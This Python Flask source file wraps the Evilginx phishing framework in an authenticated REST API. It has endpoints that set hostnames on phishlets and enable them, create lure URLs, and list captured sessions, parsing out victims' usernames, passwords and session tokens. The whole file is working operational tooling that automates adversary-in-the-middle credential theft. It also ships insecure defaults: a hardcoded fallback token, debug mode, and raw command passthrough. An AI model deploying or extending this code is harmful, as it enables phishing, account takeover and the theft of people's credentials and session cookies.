# evilginx/api_wrapper.py
from flask import Flask, request, jsonify
import os, re, logging
import datetime
import pexpect
import sys

app = Flask(__name__)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

EVILGINX_BIN              = "/usr/local/bin/evilginx"
EVILGINX_PHISHLETS_PATH   = "/app/phishlets"
API_TOKEN                 = os.environ.get('EVILGINX_API_TOKEN', 'dev_token_replace_in_production')
REPL_PROMPT               = "evilginx>"

def authenticate():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    return token == API_TOKEN

def clean_terminal_output(text):
    # Strip ANSI color codes
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    text = ansi_escape.sub('', text)
    
    # Strip other control characters
    text = re.sub(r'[\x00-\x1F\x7F-\x9F]', '', text)
    
    return text.strip()

@app.before_request
def guard():
    if request.path == '/health':
        return
    if not authenticate():
        return jsonify({"error": "Unauthorized"}), 401

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

# match either "evilginx>" or a single ":" at the start of a line
PROMPT_RE = re.compile(r"^(?:evilginx>|:)\s*$", re.MULTILINE)

def run_evilginx_commands(cmds: list[str], timeout=30) -> str:
    """
    Spawn Evilginx, send each command in `cmds` without waiting for specific prompts.
    Simply delays between commands to allow Evilginx to process them.
    """
    import time
    
    start_cmd = (
        f"{EVILGINX_BIN} "
        f"-p {EVILGINX_PHISHLETS_PATH} "
        f"-developer"
    )
    logging.info(f"Starting Evilginx REPL: {start_cmd}")
    
    try:
        child = pexpect.spawn(start_cmd, timeout=timeout, encoding='utf-8')
        log_dir = "/app/logs"
        os.makedirs(log_dir, exist_ok=True)
        child.logfile = open(f'{log_dir}/evilginx_repl.log', 'a')
        
        # Give Evilginx time to start up (adjust as needed)
        time.sleep(2)
        child.sendline("clear")
        time.sleep(1)
                # Clear any output received so far (including the ASCII art and intro)
        try:
            child.read_nonblocking(size=10000, timeout=1)
        except:
            pass
        
        transcript = ""
        #transcript = "Evilginx Command Results:\n\n"
        
        # Send each command with a delay
        for cmd in cmds:
            logging.info(f"Sending command: {cmd}")
            child.sendline(cmd)
            # Delay to allow command to complete
            time.sleep(2)
            
            # Try to get any output that has accumulated
            try:
                # Read whatever is available without blocking
                output = child.read_nonblocking(size=10000, timeout=1)
                transcript += f"$ {cmd}\n{output}\n\n"
            except pexpect.TIMEOUT:
                # No data available, which is fine
                transcript += f"$ {cmd}\n[No immediate output]\n\n"
            except Exception as e:
                transcript += f"$ {cmd}\n[Error reading output: {str(e)}]\n\n"
        
        # Final delay to allow last command to complete
        time.sleep(2)
        
        # Try to capture any final output
        try:
            final_output = child.read_nonblocking(size=10000, timeout=1)
            transcript += f"Final output:\n{final_output}\n"
        except:
            pass
        
        # Cleanup
        child.sendline("exit")
        child.close(force=True)
        
        return transcript
        
    except Exception as e:
        logging.error(f"Exception in Evilginx command execution: {str(e)}")
        return f"Error executing Evilginx commands: {str(e)}"
# —————— Commands  ——————

@app.route('/api/commands', methods=['POST'])
def run_commands():
    """
    Execute an ordered list of Evilginx REPL commands.
    Body: { "commands": ["cmd1", "cmd2", …] }
    """
    body = request.get_json(force=True, silent=True)
    cmds = body.get('commands') if isinstance(body, dict) else None

    if not isinstance(cmds, list) or not all(isinstance(c, str) for c in cmds):
        return jsonify({"error": "`commands` must be a JSON array of strings"}), 400

    try:
        transcript = run_evilginx_commands(cmds)
        return jsonify({
            "commands_ran": cmds,
            "transcript": transcript,
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
        })
    except Exception as e:
        logging.error("Error running commands: %s", e)
        return jsonify({"error": str(e)}), 500
# —————— PHISHLETS ——————

@app.route('/api/phishlets', methods=['GET'])
def list_phishlets():
    """
    List all phishlets currently imported/enabled in Evilginx.
    Extract structured information from the command output.
    """
    try:
        transcript = run_evilginx_commands(["phishlets"])
    
        # Clean the transcript
        clean_transcript = clean_terminal_output(transcript)
        
        # Extract phishlet data
        phishlets = []
        
        # Process line by line
        lines = clean_transcript.split('\n')
        in_table = False
        
        for line in lines:
            # Detect table start - look for header row
            if "phishlet" in line and "status" in line and "visibility" in line and "hostname" in line:
                in_table = True
                continue
                
            # Skip separator lines
            if "+-----------+" in line or not "|" in line:
                continue
                
            # Process data rows inside the table
            if in_table and "|" in line:
                parts = [part.strip() for part in line.split('|')]
                parts = [part for part in parts if part]  # Remove empty parts
                
                if parts and len(parts) >= 5:
                    phishlet = {
                        "name": parts[0],
                        "status": parts[1],
                        "visibility": parts[2],
                        "hostname": parts[3],
                        "unauth_url": parts[4] if len(parts) > 4 else ""
                    }
                    phishlets.append(phishlet)
        
        if not phishlets:
            logging.info("Table parsing approach failed, trying regex matching")
            phishlet_pattern = re.compile(r'(\S+)\s+(enabled|disabled)\s+(visible|hidden)\s+(\S+)(?:\s+(\S+))?')
            matches = phishlet_pattern.findall(clean_transcript)
            
            for match in matches:
                if match[0].lower() != "phishlet":
                    phishlets.append({
                        "name": match[0],
                        "status": match[1],
                        "visibility": match[2],
                        "hostname": match[3],
                        "unauth_url": match[4] if len(match) > 4 else ""
                    })
        
        return jsonify({
            "phishlets": phishlets,
            "raw_output": clean_transcript,  # Include this for debugging
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
        })
    except Exception as e:
        logging.error("Error listing phishlets: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/phishlets', methods=['POST'])
def create_phishlet():
    """
    Create a new phishlet, set hostname, and enable it.
    Extract confirmation from the command output.
    """
    data = request.json or {}
    name = data.get('name')
    template = data.get('template', 'login') 
    domain = data.get('domain')
    
    if not all([name, domain]):
        return jsonify({"error":"`name` and `domain` are required"}), 400

    cmds = [
        f"phishlets hostname {template} {name}.{domain}",
        f"phishlets enable {template}"
    ]
    
    try:
        transcript = run_evilginx_commands(cmds)
        
        # Check if the phishlet was enabled successfully
        success = False
        for line in transcript.split('\n'):
            if f"enabled phishlet" in line.lower() or f"set hostname" in line.lower():
                success = True
                break
        
        return jsonify({
            "name": name,
            "template": template,
            "domain": domain,
            "hostname": f"{name}.{domain}",
            "success": success,
            "created_at": datetime.datetime.utcnow().isoformat() + "Z",
            "raw_output": transcript
        })
    except Exception as e:
        logging.error("Error creating phishlet: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/lures', methods=['GET'])
def list_lures():
    """
    List all lures, extracting structured data from the output.
    """
    try:
        transcript = run_evilginx_commands(["lures"])
        
        # Extract lure data from the output
        lures = []
        lines = transcript.split('\n')
        capture = False
        
        for line in lines:
            if '| id ' in line:  # Header line
                capture = True
                continue
            
            if capture and '|' in line and not line.startswith('+'):
                # Parse a lure entry line
                parts = [p.strip() for p in line.split('|')]
                if len(parts) >= 9:
                    lures.append({
                        "id": parts[1],
                        "phishlet": parts[2],
                        "hostname": parts[3],
                        "path": parts[4],
                        "redirector": parts[5],
                        "redirect_url": parts[6],
                        "paused": parts[7],
                        "og": parts[8]
                    })
            
            # Stop capturing after the table ends
            if capture and '+--' in line and len(lures) > 0:
                break
        
        return jsonify({
            "lures": lures,
            "raw_output": transcript,
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
        })
    except Exception as e:
        logging.error("Error listing lures: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/lures', methods=['POST'])
def create_lure():
    """
    Create a new lure and extract its URL from the command output.
    """
    data = request.json or {}
    phishlet = data.get('phishlet_name', 'login')  # Default to login phishlet
    
    if not phishlet:
        return jsonify({"error":"`phishlet_name` is required"}), 400

    cmds = [
        f"lures create {phishlet}",
        "lures"  # List lures to see the newly created one
    ]
    
    try:
        transcript = run_evilginx_commands(cmds)
        
        # Extract the lure ID and path
        lure_id = None
        lure_path = None
        
        lines = transcript.split('\n')
        for line in lines:
            # Try to find the lure creation confirmation
            if "created lure with id:" in line.lower():
                try:
                    lure_id = line.split(":")[-1].strip()
                except:
                    pass
            
            # Or extract from the lures table
            if lure_id is None and '|' in line and phishlet in line:
                parts = [p.strip() for p in line.split('|')]
                if len(parts) >= 5:
                    lure_id = parts[1]
                    lure_path = parts[4]
        
        # Get hostname from phishlets list
        phishlets_output = run_evilginx_commands(["phishlets"])
        hostname = None
        
        for line in phishlets_output.split('\n'):
            if phishlet in line and '|' in line:
                parts = [p.strip() for p in line.split('|')]
                if len(parts) >= 5:
                    hostname = parts[4]
                    break
        
        # Construct the full URL
        url = None
        if hostname and lure_path:
            url = f"https://{hostname}{lure_path}"
        
        return jsonify({
            "id": lure_id,
            "phishlet": phishlet,
            "hostname": hostname,
            "path": lure_path,
            "url": url,
            "created_at": datetime.datetime.utcnow().isoformat() + "Z",
            "raw_output": transcript
        })
    except Exception as e:
        logging.error("Error creating lure: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/sessions', methods=['GET'])
def list_sessions():
    """
    List captured sessions and extract structured data.
    """
    try:
        transcript = run_evilginx_commands(["sessions"])
        
        # Extract session data - this will be more complex
        # as the sessions output format is quite variable
        sessions = []
        lines = transcript.split('\n')
        current_session = None
        
        for line in lines:
            if line.startswith('[') and '] [' in line:
                # This looks like a session header line
                # [id] [username] [password] [tokens] @ ip
                # Parse out the session ID
                try:
                    session_id = line.split(']')[0].strip('[')
                    current_session = {
                        "id": session_id,
                        "raw": line,
                        "tokens": {}
                    }
                    sessions.append(current_session)
                except:
                    pass
            
            # Extract token information
            elif current_session and ':' in line and not line.startswith('['):
                try:
                    key, value = line.split(':', 1)
                    current_session["tokens"][key.strip()] = value.strip()
                except:
                    pass
        
        return jsonify({
            "sessions": sessions,
            "raw_output": transcript,
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
        })
    except Exception as e:
        logging.error("Error listing sessions: %s", e)
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, ssl_context='adhoc', debug=True)
